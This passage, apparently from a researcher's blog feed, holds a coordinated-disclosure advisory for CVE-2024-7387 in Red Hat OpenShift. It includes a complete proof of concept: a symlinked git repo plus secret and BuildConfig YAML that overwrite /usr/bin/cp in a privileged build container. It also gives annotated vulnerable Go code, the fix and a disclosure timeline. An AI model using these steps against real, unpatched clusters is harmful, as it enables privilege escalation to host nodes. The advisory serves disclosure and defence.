+  <li>2025-09-23: Received S/MIME Certificate from <code class="language-plaintext highlighter-rouge">Mark.Hartmann@drivelock.com</code></li>
+  <li>2025-09-23: Sent report to DriveLock</li>
+  <li>2025-09-24: Received answer, that the found vulnerability is a duplicate and a patch is already available</li>
+</ul>]]></content><author><name></name></author><category term="advisory" /><summary type="html"><![CDATA[IMPORTANT - Duplicate The reported vulnerability is a duplicate. It was already found by someone else and a patch is already available. Still I wanted to share my analysis of the vulnerability and the patch.]]></summary></entry><entry><title type="html">[Advisory - Red Hat, OpenShift Container Platform] Path traversal allows command injection in privileged BuildContainer using docker build strategy</title><link href="/advisory/2024/10/02/openshift-build-docker-priv-esc.html" rel="alternate" type="text/html" title="[Advisory - Red Hat, OpenShift Container Platform] Path traversal allows command injection in privileged BuildContainer using docker build strategy" /><published>2024-10-02T00:00:00+00:00</published><updated>2024-10-02T00:00:00+00:00</updated><id>/advisory/2024/10/02/openshift-build-docker-priv-esc</id><content type="html" xml:base="/advisory/2024/10/02/openshift-build-docker-priv-esc.html"><![CDATA[<h1 id="product-description">Product description</h1>
+<p>Red Hat OpenShift is the leading hybrid cloud application platform, bringing together a comprehensive set of tools and services that streamline the entire application lifecycle.</p>
+
+<p>Trusted by 3,000 customers across industries (including 56% of the top 25 Global Fortune 500), it combines built-in security features with dedicated support, a trusted software supply chain, and Red Hat Enterprise Linux® as the operating foundation.</p>
+
+<p>Available in self-managed or fully managed cloud service editions, OpenShift offers a complete set of integrated tools and services for cloud-native, AI, and traditional workloads alike.</p>
+
+<p><a href="https://www.redhat.com/en/technologies/cloud-computing/openshift">Red Hat - OpenShift Platform</a></p>
+
+<h1 id="vulnerability-overview">Vulnerability overview</h1>
+
+<p><code class="language-plaintext highlighter-rouge">OpenShift</code> allows a user to create his own images with the help of the build component. This component has three primary build strategies available (<a href="https://docs.openshift.com/container-platform/4.16/cicd/builds/understanding-image-builds.html">Docu - Understanding image builds</a>):</p>
+
+<ul>
+  <li>Docker build</li>
+  <li>Source-to-Image (S2I) build</li>
+  <li>Custom build</li>
+</ul>
+
+<p>As the builds are running in a privileged container, a vulnerability in this process allows an atttacker to escalate their permissions on the cluster and host nodes.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">custom build</code> is not safe, because they can execute any code within a privileged container and are disabled by default.
+The other two strategies are considered as safe and are enabled for all users that can create builds.</p>
+
+<p>But there is a note about the <code class="language-plaintext highlighter-rouge">docker strategy</code>:</p>
+
+<blockquote>
+  <p>Grant docker build permissions with caution, because a vulnerability in the Dockerfile processing logic could result in a privileges being granted on the host node.</p>
+</blockquote>
+
+<p>See: https://docs.openshift.com/container-platform/4.16/cicd/builds/securing-builds-by-strategy.html</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">docker strategy</code> / the image used during the build has a vulnerabiliy, which allows an attacker to override files inside the privileged build container with the help of the <code class="language-plaintext highlighter-rouge">spec.source.secrets.secret.destinationDir</code> attribute of the <code class="language-plaintext highlighter-rouge">BuildConfig</code> definition. After overriding the binary, execution of this overriden file can be triggered with another secret and the malicious code is executed in the privileged container.</p>
+
+<p>As stated above, running code in a privileged container allows an attacker to escalate their permissions on the cluster and host nodes. As an example the host filesystem of the worker node can be mounted and a new <code class="language-plaintext highlighter-rouge">SSH</code> key can be added to user <code class="language-plaintext highlighter-rouge">core</code> of the <code class="language-plaintext highlighter-rouge">Red Hat Enterprise Linux CoreOS (RHCOS)</code>.</p>
+
+<h1 id="proof-of-concept">Proof of concept</h1>
+<p>To exploit the vulnerability the following steps have to be done:</p>
+
+<p>1) Create a <code class="language-plaintext highlighter-rouge">git</code> repository with a <code class="language-plaintext highlighter-rouge">Dockerfile</code> and a symbolic link to <code class="language-plaintext highlighter-rouge">/usr/bin</code>
+2) Create a secret, with the key <code class="language-plaintext highlighter-rouge">cp</code> and the content is the bash script executed during exploitation
+3) Create another secret with arbitrary content, only used to trigger the exploit
+4) Create a <code class="language-plaintext highlighter-rouge">BuildConfig</code>:</p>
+<ul>
+  <li>Using <code class="language-plaintext highlighter-rouge">docker</code> as <code class="language-plaintext highlighter-rouge">spec.strategy.type</code></li>
+  <li>Reference the created ‘git’ repo in <code class="language-plaintext highlighter-rouge">spec.source.git.uri</code></li>
+  <li>Reference both secrets in <code class="language-plaintext highlighter-rouge">spec.source.secrets</code></li>
+  <li>Set the <code class="language-plaintext highlighter-rouge">spec.source.secrets[0].destinationDir</code> attr to the symblic link from to <code class="language-plaintext highlighter-rouge">git</code> repo
+5) Trigger the build, which executes the payload in the privileged container</li>
+</ul>
+
+<h2 id="step1---git-repo">Step1 - Git repo</h2>
+<p>Create a <code class="language-plaintext highlighter-rouge">git</code> repository which can be access by <code class="language-plaintext highlighter-rouge">OpenShift</code> and add a <code class="language-plaintext highlighter-rouge">Dockerfile</code> and a symbolic link.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /tmp/poc-repo
+<span class="nb">cd</span> /tmp/poc-repo
+git init
+<span class="nb">touch </span>Dockerfile
+<span class="c"># provide content for dockerfile</span>
+<span class="nb">ln</span> <span class="nt">-s</span> /usr/bin usr_bin
+
+git add Dockerfile  usr_bin
+git commit <span class="nt">-m</span> <span class="s2">"PoC"</span>
+git push
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">Dockerfile</code> has the following content (snippet):</p>
+
+<div class="language-dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">COPY</span><span class="s"> . .</span>
+<span class="k">RUN </span><span class="nb">ls</span> <span class="nt">-la</span>
+</code></pre></div></div>
+<p><em><a href="/assets/openshift/Dockerfile">Dockerfile</a></em></p>
+
+<p>It copies all files from the current <code class="language-plaintext highlighter-rouge">docker build</code> <code class="language-plaintext highlighter-rouge">ContextDir</code>. During the build the <code class="language-plaintext highlighter-rouge">ContextDir</code> is set to <code class="language-plaintext highlighter-rouge">/tmp/build/inputs/</code> in the privilged build containers filesystem.
+Then it lists all copied files via <code class="language-plaintext highlighter-rouge">ls</code>.</p>
+
+<h2 id="step2---create-secret-with-payload-to-execute">Step2 - Create secret with payload to execute</h2>
+<p>Create a new secret which uses the key <code class="language-plaintext highlighter-rouge">cp</code> and set the exploit payload as value and apply it.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">kind</span><span class="pi">:</span> <span class="s">Secret</span>
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">build-path-traversal</span>  
+<span class="na">stringData</span><span class="pi">:</span>
+  <span class="na">cp</span><span class="pi">:</span> <span class="pi">|</span>
+    <span class="s">#!/bin/bash</span>
+    
+    <span class="s">touch /tmp/build/inputs/poc-rce.txt</span>
+<span class="na">type</span><span class="pi">:</span> <span class="s">Opaque</span>
+
+</code></pre></div></div>
+<p><em><a href="/assets/openshift/definition/secret-build-path-traversal.yaml">secret-build-path-traversal.yaml</a></em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oc apply <span class="nt">-f</span> ./definition/secret-build-path-traversal.yaml 
+secret/build-path-traversal created
+</code></pre></div></div>
+
+<p>The provided payload creates a file in the <code class="language-plaintext highlighter-rouge">docker build</code> <code class="language-plaintext highlighter-rouge">ContextDir</code>, which should be copied to the image during the build via <code class="language-plaintext highlighter-rouge">COPY . .</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash    </span>
+<span class="nb">touch</span> /tmp/build/inputs/poc-rce.txt
+</code></pre></div></div>
+
+<h2 id="step3---create-the-trigger-secret">Step3 - Create the “trigger” secret</h2>
+<p>Create a new secret with arbitrary content and apply it.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">kind</span><span class="pi">:</span> <span class="s">Secret</span>
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">trigger-rce</span>
+<span class="na">stringData</span><span class="pi">:</span>
+  <span class="na">trigger</span><span class="pi">:</span> <span class="s">pwned</span>
+
+<span class="na">type</span><span class="pi">:</span> <span class="s">Opaque</span>
+
+</code></pre></div></div>
+<p><em><a href="/assets/openshift/definition/secret-trigger-rce.yaml">secret-trigger-rce.yml</a></em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oc apply <span class="nt">-f</span> ./definition/secret-trigger-rce.yaml
+secret/trigger-rce created
+</code></pre></div></div>
+
+<h2 id="step4---create-a-buildconfig">Step4 - Create a BuildConfig</h2>
+<p>Then <code class="language-plaintext highlighter-rouge">BuildConfig</code> config has to be created and applied.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">kind</span><span class="pi">:</span> <span class="s">BuildConfig</span>
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">build.openshift.io/v1</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">build-priv-esc</span>
+<span class="na">spec</span><span class="pi">:</span>
+  <span class="na">nodeSelector</span><span class="pi">:</span> <span class="no">null</span>
+  <span class="na">strategy</span><span class="pi">:</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">Docker</span>
+    <span class="na">dockerStrategy</span><span class="pi">:</span>    
+      <span class="na">dockerfilePath</span><span class="pi">:</span> <span class="s">Dockerfile</span>
+  <span class="na">source</span><span class="pi">:</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">Git</span>
+    <span class="na">git</span><span class="pi">:</span>
+      <span class="na">uri</span><span class="pi">:</span> <span class="s1">'</span><span class="s">https://&lt;REDACTED&gt;/build-rce-poc.git'</span>
+      <span class="na">ref</span><span class="pi">:</span> <span class="s">main</span>
+    <span class="na">contextDir</span><span class="pi">:</span> <span class="s">/</span>
+    <span class="na">secrets</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">secret</span><span class="pi">:</span>
+          <span class="na">name</span><span class="pi">:</span> <span class="s">build-path-traversal</span>
+        <span class="na">destinationDir</span><span class="pi">:</span> <span class="s">usr_bin</span>
+      <span class="pi">-</span> <span class="na">secret</span><span class="pi">:</span>
+          <span class="na">name</span><span class="pi">:</span> <span class="s">trigger-rce</span>
+</code></pre></div></div>
+<p><em><a href="/assets/openshift/definition/build-cfg.yaml">build-cfg.yaml</a></em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oc apply <span class="nt">-f</span> ./definition/build-cfg.yaml
+buildconfig.build.openshift.io/build-priv-esc created
+</code></pre></div></div>
+
+<p>The important parts of this definion are:</p>
+<ul>
+  <li>Using the <code class="language-plaintext highlighter-rouge">docker strategy</code>:
+    <div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">spec</span><span class="pi">:</span>
+  <span class="na">nodeSelector</span><span class="pi">:</span> <span class="no">null</span>
+  <span class="na">strategy</span><span class="pi">:</span>
+    <span class="na">type</span><span class="pi">:</span> <span class="s">Docker</span>  
+</code></pre></div>    </div>
+  </li>
+  <li>Set the <code class="language-plaintext highlighter-rouge">destinationDir</code> of <code class="language-plaintext highlighter-rouge">secret/build-path-traversal</code> to the symbolic link in the <code class="language-plaintext highlighter-rouge">git</code> repo
+    <div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">spec</span><span class="pi">:</span>
+<span class="c1"># ....  </span>
+    <span class="na">contextDir</span><span class="pi">:</span> <span class="s">/</span>
+    <span class="na">secrets</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">secret</span><span class="pi">:</span>
+          <span class="na">name</span><span class="pi">:</span> <span class="s">build-path-traversal</span>
+        <span class="na">destinationDir</span><span class="pi">:</span> <span class="s">usr_bin</span>  
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="step5---trigger-the-build--rce">Step5 - Trigger the build / RCE</h2>
+<p>After starting the build, the log can be inspected and verified that <code class="language-plaintext highlighter-rouge">RUN ls -la</code> lists the file <code class="language-plaintext highlighter-rouge">poc-rce.txt</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oc start-build build-priv-esc
+build.build.openshift.io/build-priv-esc-7 started
+</code></pre></div></div>
+
+<pre><code class="language-txt">...
+STEP 5/8: RUN ls -la
+total 4
+drwxr-xr-x    1 root     root            70 Jul 31 07:57 .
+dr-xr-xr-x    1 root     root            17 Jul 31 07:57 ..
+drwxr-xr-x    8 root     root           163 Jul 31 07:57 .git
+-rw-r--r--    1 root     root           967 Jul 31 07:57 Dockerfile
+-rw-r--r--    1 root     root             0 Jul 31 07:57 poc-rce.txt
+...
+</code></pre>
+<p><em><a href="/assets/openshift/build-log.txt">Build log</a></em></p>
+
+<h1 id="source-of-the-bug">Source of the bug</h1>
+<p>The source code of the builder image can be found on <a href="https://github.com/openshift/builder">GitHub - Builder</a>.
+Doing some manual source code review revealed the bug. The code for handling the <code class="language-plaintext highlighter-rouge">docker strategy</code> and copying secrets can be found in <code class="language-plaintext highlighter-rouge">pkg\build\builder\docker.go</code>.</p>
+
+<blockquote>
+  <p>!NOTE<br />
+Comments with the prefix <code class="language-plaintext highlighter-rouge">// &lt;&lt;!! PoC Review !! &gt;&gt;</code> highlight key parts for the exploit.</p>
+</blockquote>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">// FILE: pkg\build\builder\docker.go</span>
+
+<span class="c">// ----------</span>
+<span class="c">// dockerBuild performs a docker build on the source that has been retrieved</span>
+<span class="k">func</span> <span class="p">(</span><span class="n">d</span> <span class="o">*</span><span class="n">DockerBuilder</span><span class="p">)</span> <span class="n">dockerBuild</span><span class="p">(</span><span class="n">ctx</span> <span class="n">context</span><span class="o">.</span><span class="n">Context</span><span class="p">,</span> <span class="n">dir</span> <span class="kt">string</span><span class="p">,</span> <span class="n">tag</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="n">noCache</span> <span class="kt">bool</span>
+	<span class="k">var</span> <span class="n">forcePull</span> <span class="kt">bool</span>
+	<span class="k">var</span> <span class="n">buildArgs</span> <span class="p">[]</span><span class="n">docker</span><span class="o">.</span><span class="n">BuildArg</span>
+	<span class="n">dockerfilePath</span> <span class="o">:=</span> <span class="n">defaultDockerfilePath</span>
+	<span class="k">if</span> <span class="n">d</span><span class="o">.</span><span class="n">build</span><span class="o">.</span><span class="n">Spec</span><span class="o">.</span><span class="n">Strategy</span><span class="o">.</span><span class="n">DockerStrategy</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="n">d</span><span class="o">.</span><span class="n">build</span><span class="o">.</span><span class="n">Spec</span><span class="o">.</span><span class="n">Source</span><span class="o">.</span><span class="n">ContextDir</span> <span class="o">!=</span> <span class="s">""</span> <span class="p">{</span>
+			<span class="n">dir</span> <span class="o">=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">dir</span><span class="p">,</span> <span class="n">d</span><span class="o">.</span><span class="n">build</span><span class="o">.</span><span class="n">Spec</span><span class="o">.</span><span class="n">Source</span><span class="o">.</span><span class="n">ContextDir</span><span class="p">)</span>
+		<span class="p">}</span>
+		<span class="k">if</span> <span class="n">d</span><span class="o">.</span><span class="n">build</span><span class="o">.</span><span class="n">Spec</span><span class="o">.</span><span class="n">Strategy</span><span class="o">.</span><span class="n">DockerStrategy</span><span class="o">.</span><span class="n">DockerfilePath</span> <span class="o">!=</span> <span class="s">""</span> <span class="p">{</span>
+			<span class="n">dockerfilePath</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">build</span><span class="o">.</span><span class="n">Spec</span><span class="o">.</span><span class="n">Strategy</span><span class="o">.</span><span class="n">DockerStrategy</span><span class="o">.</span><span class="n">DockerfilePath</span>
+		<span class="p">}</span>
+		<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">ba</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">d</span><span class="o">.</span><span class="n">build</span><span class="o">.</span><span class="n">Spec</span><span class="o">.</span><span class="n">Strategy</span><span class="o">.</span><span class="n">DockerStrategy</span><span class="o">.</span><span class="n">BuildArgs</span> <span class="p">{</span>
+			<span class="n">buildArgs</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">buildArgs</span><span class="p">,</span> <span class="n">docker</span><span class="o">.</span><span class="n">BuildArg</span><span class="p">{</span><span class="n">Name</span><span class="o">:</span> <span class="n">ba</span><span class="o">.</span><span class="n">Name</span><span class="p">,</span> <span class="n">Value</span><span class="o">:</span> <span class="n">ba</span><span class="o">.</span><span class="n">Value</span><span class="p">})</span>
+		<span class="p">}</span>
+		<span class="n">noCache</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">build</span><span class="o">.</span><span class="n">Spec</span><span class="o">.</span><span class="n">Strategy</span><span class="o">.</span><span class="n">DockerStrategy</span><span class="o">.</span><span class="n">NoCache</span>
+		<span class="n">forcePull</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">build</span><span class="o">.</span><span class="n">Spec</span><span class="o">.</span><span class="n">Strategy</span><span class="o">.</span><span class="n">DockerStrategy</span><span class="o">.</span><span class="n">ForcePull</span>
+	<span class="p">}</span>
+
+	<span class="n">auth</span> <span class="o">:=</span> <span class="n">mergeNodeCredentialsDockerAuth</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Getenv</span><span class="p">(</span><span class="n">dockercfg</span><span class="o">.</span><span class="n">PullAuthType</span><span class="p">))</span>
+
+
+  <span class="c">// &lt;&lt;!! PoC Review !! &gt;&gt;</span>
+  <span class="c">// Call copySecrets during a dockerBuild  </span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">d</span><span class="o">.</span><span class="n">copySecrets</span><span class="p">(</span><span class="n">d</span><span class="o">.</span><span class="n">build</span><span class="o">.</span><span class="n">Spec</span><span class="o">.</span><span class="n">Source</span><span class="o">.</span><span class="n">Secrets</span><span class="p">,</span> <span class="n">dir</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="n">err</span>
+	<span class="p">}</span>
+
+<span class="c">// ----------</span>
+
+<span class="c">// copySecrets copies all files from the directory where the secret is</span>
+<span class="c">// mounted in the builder pod to a directory where the is the Dockerfile, so</span>
+<span class="c">// users can ADD or COPY the files inside their Dockerfile.</span>
+<span class="k">func</span> <span class="p">(</span><span class="n">d</span> <span class="o">*</span><span class="n">DockerBuilder</span><span class="p">)</span> <span class="n">copySecrets</span><span class="p">(</span><span class="n">secrets</span> <span class="p">[]</span><span class="n">buildapiv1</span><span class="o">.</span><span class="n">SecretBuildSource</span><span class="p">,</span> <span class="n">targetDir</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="n">err</span> <span class="kt">error</span>
+	<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">s</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">secrets</span> <span class="p">{</span>
+		<span class="n">err</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">copyLocalObject</span><span class="p">(</span><span class="n">secretSource</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">secretBuildSourceBaseMountPath</span><span class="p">,</span> <span class="n">targetDir</span><span class="p">)</span>
+		<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+			<span class="k">return</span> <span class="n">err</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="no">nil</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="p">(</span><span class="n">d</span> <span class="o">*</span><span class="n">DockerBuilder</span><span class="p">)</span> <span class="n">copyLocalObject</span><span class="p">(</span><span class="n">s</span> <span class="n">localObjectBuildSource</span><span class="p">,</span> <span class="n">sourceDir</span><span class="p">,</span> <span class="n">targetDir</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
+
+
+  <span class="c">// &lt;&lt;!! PoC Review !! &gt;&gt;</span>
+  <span class="c">// Create dstDir based on the value specified in the BuildConfig definition</span>
+  <span class="c">// targetDir := /tmp/build/inputs/  -- docker build context</span>
+  <span class="c">// s.DestinationPath() := usr_bin</span>
+  <span class="c">// dstDir == /tmp/build/inputs/usr_bin -- Which is a symbolic link to /usr/bin</span>
+	<span class="n">dstDir</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">targetDir</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">DestinationPath</span><span class="p">())</span>
+
+
+  <span class="c">// &lt;&lt;!! PoC Review !! &gt;&gt;</span>
+  <span class="c">// Make everything in dstDir `rwx' for `user,group other` `0777`</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">MkdirAll</span><span class="p">(</span><span class="n">dstDir</span><span class="p">,</span> <span class="m">0777</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="n">err</span>
+	<span class="p">}</span>
+	<span class="n">log</span><span class="o">.</span><span class="n">V</span><span class="p">(</span><span class="m">3</span><span class="p">)</span><span class="o">.</span><span class="n">Infof</span><span class="p">(</span><span class="s">"Copying files from the build source %q to %q"</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">LocalObjectRef</span><span class="p">()</span><span class="o">.</span><span class="n">Name</span><span class="p">,</span> <span class="n">dstDir</span><span class="p">)</span>
+
+	<span class="c">// Build sources contain nested directories and fairly baroque links. To prevent extra data being</span>
+	<span class="c">// copied, perform the following steps:</span>
+	<span class="c">//</span>
+	<span class="c">// 1. Only top level files and directories within the secret directory are candidates</span>
+	<span class="c">// 2. Any item starting with '..' is ignored</span>
+	<span class="c">// 3. Destination directories are created first with 0777</span>
+	<span class="c">// 4. Use the '-L' option to cp to copy only contents.</span>
+	<span class="c">//</span>
+	<span class="n">srcDir</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">sourceDir</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">LocalObjectRef</span><span class="p">()</span><span class="o">.</span><span class="n">Name</span><span class="p">)</span>
+
+
+  <span class="c">// &lt;&lt;!! PoC Review !! &gt;&gt;</span>
+  <span class="c">// Walk the the mounted secrets specified in the `BuildConfig`</span>
+  <span class="c">// As we named the key in `secret/build-path-traversal` `cp` there is a file mounted with this name</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Walk</span><span class="p">(</span><span class="n">srcDir</span><span class="p">,</span> <span class="k">func</span><span class="p">(</span><span class="n">path</span> <span class="kt">string</span><span class="p">,</span> <span class="n">info</span> <span class="n">os</span><span class="o">.</span><span class="n">FileInfo</span><span class="p">,</span> <span class="n">err</span> <span class="kt">error</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+			<span class="k">return</span> <span class="n">err</span>
+		<span class="p">}</span>
+		<span class="k">if</span> <span class="n">srcDir</span> <span class="o">==</span> <span class="n">path</span> <span class="p">{</span>
+			<span class="k">return</span> <span class="no">nil</span>
+		<span class="p">}</span>
+
+		<span class="c">// skip any contents that begin with ".."</span>
+		<span class="k">if</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">filepath</span><span class="o">.</span><span class="n">Base</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="s">".."</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">if</span> <span class="n">info</span><span class="o">.</span><span class="n">IsDir</span><span class="p">()</span> <span class="p">{</span>
+				<span class="k">return</span> <span class="n">filepath</span><span class="o">.</span><span class="n">SkipDir</span>
+			<span class="p">}</span>
+			<span class="k">return</span> <span class="no">nil</span>
+		<span class="p">}</span>
+
+		<span class="c">// ensure all directories are traversable</span>
+		<span class="k">if</span> <span class="n">info</span><span class="o">.</span><span class="n">IsDir</span><span class="p">()</span> <span class="p">{</span>
+			<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">MkdirAll</span><span class="p">(</span><span class="n">dstDir</span><span class="p">,</span> <span class="m">0777</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+				<span class="k">return</span> <span class="n">err</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+
+
+    <span class="c">// &lt;&lt;!! PoC Review !! &gt;&gt;</span>
+    <span class="c">// Use the `cp` command to copy the mounted secrets to the 'ContextDir'</span>
+    <span class="c">// During processing of `secret/build-path-traversal`</span>
+    <span class="c">// cp copies /run/secrets/buidl-path-traversal/cp to /tmp/build/inputs/usr_bin/cp</span>
+    <span class="c">// As /tmp/build/inputs/usr_bin is a symbolic link to /usr/bin /usr/bin/cp is replaced by the payload</span>
+
+    <span class="c">// During processing of `secret/trgger-rce` `/usr/bin/cp` is already replaced by the payload and is executed</span>
+    <span class="c">// in the privileged build container</span>
+		<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"cp"</span><span class="p">,</span> <span class="s">"-vLRf"</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">dstDir</span><span class="o">+</span><span class="s">"/"</span><span class="p">)</span><span class="o">.</span><span class="n">Output</span><span class="p">()</span>
+		<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+			<span class="n">log</span><span class="o">.</span><span class="n">V</span><span class="p">(</span><span class="m">4</span><span class="p">)</span><span class="o">.</span><span class="n">Infof</span><span class="p">(</span><span class="s">"Build source %q failed to copy: %q"</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">LocalObjectRef</span><span class="p">()</span><span class="o">.</span><span class="n">Name</span><span class="p">,</span> <span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">))</span>
+			<span class="k">return</span> <span class="n">err</span>
+		<span class="p">}</span>		
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h1 id="solution">Solution</h1>
+
+<p>To fix this vulnerability the variable <code class="language-plaintext highlighter-rouge">dstDir</code> in the function <code class="language-plaintext highlighter-rouge">copyLocalObject</code> has to be validated to share a common <code class="language-plaintext highlighter-rouge">basePath</code> with the <code class="language-plaintext highlighter-rouge">docker build</code> <code class="language-plaintext highlighter-rouge">ContextDir</code> after it has been made absolute (resolve <code class="language-plaintext highlighter-rouge">/../</code> ) and canonicalized (resolve symblic links).</p>
+
+<h1 id="version-information">Version information</h1>
+<p>The vulnerability was found and verified using the application versions listed below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oc version                                                                                     
+Client Version: 4.12.0-202405222205.p0.gd691257.assembly.stream.el8-d691257
+Kustomize Version: v4.5.7
+Server Version: 4.12.59
+Kubernetes Version: v1.25.16+306a47e
+
+oc get pod build-priv-esc-7-build <span class="nt">-o</span> json  | jq <span class="s2">".spec.containers[0].image"</span>
+<span class="s2">"quay.io/openshift-release-dev/ocp-v4.0-art-dev@sha256:77faaecb0f5e2d59fe9181800b029c9186ca30e2c57353f890ee5a04b41ee1d7"</span>
+</code></pre></div></div>
+
+<h1 id="fixes">Fixes</h1>
+<p>See <a href="https://access.redhat.com/security/cve/CVE-2024-7387">RedHat - CVE-2024-7387</a> <code class="language-plaintext highlighter-rouge">Affected Packages and Issued Red Hat Security Errata</code></p>
+
+<h1 id="timeline">Timeline</h1>
+<ul>
+  <li>2024-07-31: Vendor contacted via secalert@redhat.com, GPG encrypted</li>
+  <li>2024-08-01: Vendor replied that they are working on the report and that they resevered CVE-2024-7387</li>
+  <li>2024-08-16: Asked the vendor about an status update</li>
+  <li>2024-08-26: Asked the vendor again about an status update</li>
+  <li>2024-08-26: Vendor replied that they are still working on it and have no specific release date for the fix</li>
+  <li>2024-09-12: Vendor informed me that the vulnerability info would be published on 2024-09-16</li>
+  <li>2024-09-16: Vendor released public information about the vulnerability at https://access.redhat.com/security/cve/CVE-2024-7387</li>
+  <li>2024-09-19: Vendor released fixed versions</li>
+</ul>]]></content><author><name></name></author><category term="advisory" /><summary type="html"><![CDATA[Product description Red Hat OpenShift is the leading hybrid cloud application platform, bringing together a comprehensive set of tools and services that streamline the entire application lifecycle.]]></summary></entry></feed>
